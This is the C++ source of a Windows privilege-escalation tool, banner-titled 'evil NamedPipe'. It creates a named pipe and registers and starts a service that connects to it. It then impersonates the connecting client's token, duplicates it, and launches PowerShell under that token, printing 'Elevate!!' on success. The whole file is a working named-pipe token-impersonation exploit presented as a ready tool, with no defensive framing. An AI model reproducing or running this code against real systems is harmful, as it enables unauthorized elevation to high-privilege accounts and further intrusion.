	#include<Windows.h>
	#include<iostream>

	int main() {
		//
		std::wcout << "##################################################################################" << std::endl;
		std::wcout << "#              _   _     _  _                           _   ___   _              #" << std::endl;
		std::wcout << "#  ___  __ __ (_) | |   | \\| |  __ _   _ __    ___   __| | | _ \\ (_)  _ __   ___ #" << std::endl;
		std::wcout << "# / -_) \\ V / | | | |   | .` | / _` | | '  \\  / -_) / _` | |  _/ | | | '_ \\ / -_)#" << std::endl;
		std::wcout << "# \\___|  \\_/  |_| |_|   |_|\\_| \\__,_| |_|_|_| \\___| \\__,_| |_|   |_| | .__/ \\___|#" << std::endl;
		std::wcout << "#                                                                    |_|         #" << std::endl;
		std::wcout << "##################################################################################" << std::endl;
		std::wcout << "By ConsT27" << std::endl;
		//
		LPCWSTR pipeName = L"\\\\.\\pipe\\testpipe";
		LPVOID pipeBuffer = NULL;
		HANDLE serverPipe;
		DWORD readBytes = 0;
		DWORD readBuffer = 0;
		int err = 0;
		BOOL isPipeConnected;
		BOOL isPipeOpen;
		wchar_t message[] = L"HELL";
		DWORD messageLenght = lstrlen(message) * 2;
		DWORD bytesWritten = 0;
		WCHAR message2[512] = { 0 };
	//Open a Named Pipe,Wait for a connection
		std::wcout << "[+]Creating named pipe " << pipeName << std::endl;
		serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);

	//Create a service of system to connect to our NamedPipe.

		char servicename[] = "Service.exe";
		char servicepath[_MAX_PATH];
		SERVICE_STATUS status;
		GetModuleFileNameA(LoadLibraryA(servicename), servicepath, sizeof(servicepath));
		SC_HANDLE scManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
		if (GetLastError() == 0) {

		}
		else {
			std::cout << "[!]ERROR OpenSCManager:" << GetLastError() << std::endl;
		}
		SC_HANDLE scService = CreateServiceA(scManager, servicename, servicename,
			SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
			servicepath, NULL, NULL, NULL, NULL, NULL);
		if (!scService) {
			if (GetLastError() == 1073) {
				std::cout << "[+]The Service has been exsisted" << std::endl;
			}
			else {
				std::cout << "[!]ERROR CreateServiceA:" << GetLastError() << std::endl;
			}
		}
		SC_HANDLE scServiceA = OpenServiceA(scManager, servicename, SERVICE_ALL_ACCESS);
		if (StartService(scServiceA, 0, NULL)) {
			std::cout<<"[+]service Start success"<<std::endl;
		}
		else {
			if (GetLastError() == 1056) {
				std::cout << "[!]service is running,don't need to start again" << std::endl;
			}
		}
	//Connect !
		isPipeConnected = ConnectNamedPipe(serverPipe, NULL);

		if (isPipeConnected) {
			std::wcout << "[+]Incoming connection to " << pipeName << std::endl;
			ReadFile(serverPipe, &message2, 512, &bytesWritten, NULL);
			std::cout << "[+]Get the message from Service:"<<message2<<std::endl;
		}
		else {
			std::cout << "[!]Does not connected Error: "<<GetLastError() << std::endl;
		}

		std::wcout << "[+]Sending message: " << message << std::endl;
		WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);
	//Toekn Impersonation
		std::wcout << "[+]Impersonating the client..." << std::endl;
		if (!ImpersonateNamedPipeClient(serverPipe)) {
			std::cout<<"[!]ImpersonateNamedPipeClient ERROR: "<<GetLastError()<<std::endl;
		}
		else {
		std::cout << "[+]ImpersonateNamedPipeClient success" << std::endl;
		}

		STARTUPINFOA si;
		PROCESS_INFORMATION pi = {};
		ZeroMemory(&pi, sizeof(pi));
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		HANDLE token;
		if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &token)) {
			std::cout << "[!]GetCurrentThread ERROR:" << GetLastError() << std::endl;
		}
	
		CHAR command1[] = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
		WCHAR command2[] = L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
		HANDLE Token;
		if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS,NULL, SecurityImpersonation, TokenImpersonation,&Token)) {
			std::cout << "[!]DuplicateTokenEx ERROR:" << GetLastError() << std::endl;
		}
		else {
			std::cout << "[+]Impersonate completed" << std::endl;
		}
		if (!CreateProcessAsUserA(token, NULL, command1, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
			std::cout << "CreateProcessAsUserA ERROR:" << GetLastError() <<" Now Use CreateProcessWithTokenW"<< std::endl;
			if (!CreateProcessWithTokenW(token, LOGON_NETCREDENTIALS_ONLY, NULL, command2, NULL, NULL, NULL, (LPSTARTUPINFOW)&si, &pi)) {
				std::cout << "[-]CreateProcessWithTokenW ERROR:" << GetLastError() << std::endl;
			}
			else {
				std::cout << "[+]CreateProcessWithTokenW success" << std::endl;
			}
		}
		else {
			std::cout << "[+]CreateProcessWithTokenW success" << std::endl;
			std::cout << "[+]Elevate!!" << std::endl;
		}

		while(1){}
	}